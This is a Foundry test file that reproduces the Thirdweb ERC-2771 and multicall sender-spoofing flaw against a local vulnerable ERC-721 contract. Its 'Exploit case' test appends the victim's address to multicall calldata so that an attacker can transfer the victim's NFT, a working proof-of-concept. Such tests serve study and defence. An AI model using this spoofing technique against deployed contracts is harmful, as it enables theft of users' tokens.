// SPDX-License-Identifier: MIT

pragma solidity ^0.8.21;

import {Test, console} from "forge-std/Test.sol";
import {ERC721Vulnerability} from "../../src/ThirdwebVulnerability/ERC721Vulnerability.sol";
import {Forwarder} from "../../src/ThirdwebVulnerability/Forwarder.sol";
import {ERC2771Forwarder} from "@openzeppelin/contracts/metatx/ERC2771Forwarder.sol";
import {MessageHashUtils} from "../../lib/openzeppelin-contracts/contracts/utils/cryptography/MessageHashUtils.sol";

contract ERC721VulnerabilityTest is Test {
    using MessageHashUtils for bytes32;

    ERC721Vulnerability erc721;
    ERC721Vulnerability erc721Impl;
    Forwarder forwarder;

    Account victim = makeAccount("account");
    Account atacker = makeAccount("atacker");

    bytes32 private constant _TYPE_HASH = keccak256(
        "EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"
    );

    bytes32 internal constant _FORWARD_REQUEST_TYPEHASH = keccak256(
        "ForwardRequest(address from,address to,uint256 value,uint256 gas,uint256 nonce,uint48 deadline,bytes data)"
    );

    function getForwardRequestDataSignatureRaw(
        ERC2771Forwarder.ForwardRequestData memory request,
        uint256 nonce,
        uint256 privateKey,
        bytes32 domainSeparator
    ) internal pure returns (uint8 v, bytes32 r, bytes32 s) {
        bytes32 msgHash = keccak256(
            abi.encodePacked(
                "\x19\x01",
                domainSeparator,
                keccak256(
                    abi.encode(
                        _FORWARD_REQUEST_TYPEHASH,
                        request.from,
                        request.to,
                        request.value,
                        request.gas,
                        nonce,
                        request.deadline,
                        keccak256(request.data)
                    )
                )
            )
        );

        (v, r, s) = vm.sign(privateKey, msgHash);
    }

    function getForwardRequestDataSignature(
        ERC2771Forwarder.ForwardRequestData memory request,
        uint256 nonce,
        uint256 privateKey,
        bytes32 domainSeparator
    ) internal pure returns (bytes memory sig) {
        (uint8 v, bytes32 r, bytes32 s) = getForwardRequestDataSignatureRaw(
            request, nonce, privateKey, domainSeparator
        );
        return bytes.concat(r, s, bytes1(v));
    }

    modifier victimMint() {
        erc721.mint(victim.addr, 1);
        _;
    }

    function setUp() public {
        forwarder = new Forwarder(address(this));
        erc721 = new ERC721Vulnerability(address(forwarder));

        console.log("forwarder: %s", address(forwarder));
        console.log("erc721: %s", address(erc721));
        console.log("victim: %s", victim.addr);
        console.log("atacker: %s", atacker.addr);
    }

    //********************************************
    // Normal case to check ERC721Vulnerability
    //********************************************
    function testMint() public {
        erc721.mint(address(this), 1);
        assertEq(erc721.balanceOf(address(this)), 1);
    }

    function testMulticall() public {
        bytes[] memory data = new bytes[](2);
        data[0] = abi.encodeWithSelector(erc721.mint.selector, victim.addr, 1);
        data[1] = abi.encodeWithSelector(erc721.mint.selector, atacker.addr, 2);
        vm.startPrank(victim.addr);
        erc721.multicall(data);
        vm.stopPrank();
        assertEq(erc721.balanceOf(victim.addr), 1);
        assertEq(erc721.balanceOf(atacker.addr), 1);
    }

    function testMetaTx() public victimMint {
        assertEq(erc721.balanceOf(victim.addr), 1);
        assertEq(erc721.balanceOf(atacker.addr), 0);

        ERC2771Forwarder.ForwardRequestData memory request = ERC2771Forwarder.ForwardRequestData({
            from: victim.addr,
            to: address(erc721),
            value: 0,
            gas: 100_000,
            deadline: 100_000,
            data: abi.encodeWithSelector(erc721.transferFrom.selector, victim.addr, atacker.addr, 1),
            signature: bytes("")
        });

        // define domain separator
        bytes32 domainSeparator = keccak256(
            abi.encode(
                _TYPE_HASH,
                keccak256(bytes("Forwarder")),
                keccak256(bytes("1")),
                block.chainid,
                address(forwarder)
            )
        );

        // sign forward request data
        bytes memory signature = getForwardRequestDataSignature(
            request,
            forwarder.nonces(address(atacker.addr)),
            victim.key,
            domainSeparator
        );

        // update forward request data object with signature
        request.signature = signature;

        vm.startPrank(atacker.addr);
        forwarder.execute(request);
        vm.stopPrank();

        assertEq(erc721.balanceOf(victim.addr), 0);
        assertEq(erc721.balanceOf(atacker.addr), 1);
    }

    //********************************************
    // Exploit case
    //********************************************
    function testMetaTxAndMulticall() public victimMint {
        assertEq(erc721.balanceOf(victim.addr), 1);
        assertEq(erc721.balanceOf(atacker.addr), 0);

        bytes[] memory data = new bytes[](1);
        // add victim address to data
        data[0] =  bytes.concat(abi.encodeWithSelector(erc721.transferFrom.selector, victim.addr, atacker.addr, 1), abi.encodePacked(victim.addr));

        // normal case
        // data[0] =  abi.encodeWithSelector(erc721.transferFrom.selector, victim.addr, atacker.addr, 1);

        ERC2771Forwarder.ForwardRequestData memory request = ERC2771Forwarder.ForwardRequestData({
            from: atacker.addr,
            to: address(erc721),
            value: 0,
            gas: 100_000,
            deadline: 100_000,
            data: abi.encodeWithSelector(erc721.multicall.selector, data),
            signature: bytes("")
        });

        // define domain separator
        bytes32 domainSeparator = keccak256(
            abi.encode(
                _TYPE_HASH,
                keccak256(bytes("Forwarder")),
                keccak256(bytes("1")),
                block.chainid,
                address(forwarder)
            )
        );

        // sign forward request data
        bytes memory signature = getForwardRequestDataSignature(
            request,
            forwarder.nonces(address(atacker.addr)),
            atacker.key,
            domainSeparator
        );

        // update forward request data object with signature
        request.signature = signature;

        vm.startPrank(atacker.addr);
        forwarder.execute(request);
        vm.stopPrank();

        // success exploit
        assertEq(erc721.balanceOf(victim.addr), 0);
        assertEq(erc721.balanceOf(atacker.addr), 1);
    }

    //********************************************
    // Try to exploit but fail(only use meta tx)
    //********************************************
    function testTryToExploitButFail() public {
        ERC2771Forwarder.ForwardRequestData memory request = ERC2771Forwarder.ForwardRequestData({
            from: atacker.addr,
            to: address(erc721),
            value: 0,
            gas: 100_000,
            deadline: 100_000,
            // add victim address to data
            data: bytes.concat(abi.encodeWithSelector(erc721.transferFrom.selector, victim.addr, atacker.addr, 1), abi.encodePacked(victim.addr)),
            signature: bytes("")
        });

        // define domain separator
        bytes32 domainSeparator = keccak256(
            abi.encode(
                _TYPE_HASH,
                keccak256(bytes("Forwarder")),
                keccak256(bytes("1")),
                block.chainid,
                address(forwarder)
            )
        );

        // sign forward request data
        bytes memory signature = getForwardRequestDataSignature(
            request,
            forwarder.nonces(address(atacker.addr)),
            atacker.key,
            domainSeparator
        );

        // update forward request data object with signature
        request.signature = signature;

        vm.startPrank(atacker.addr);
        vm.expectRevert(); // fail exploit
        forwarder.execute(request);
        vm.stopPrank();
    }
}
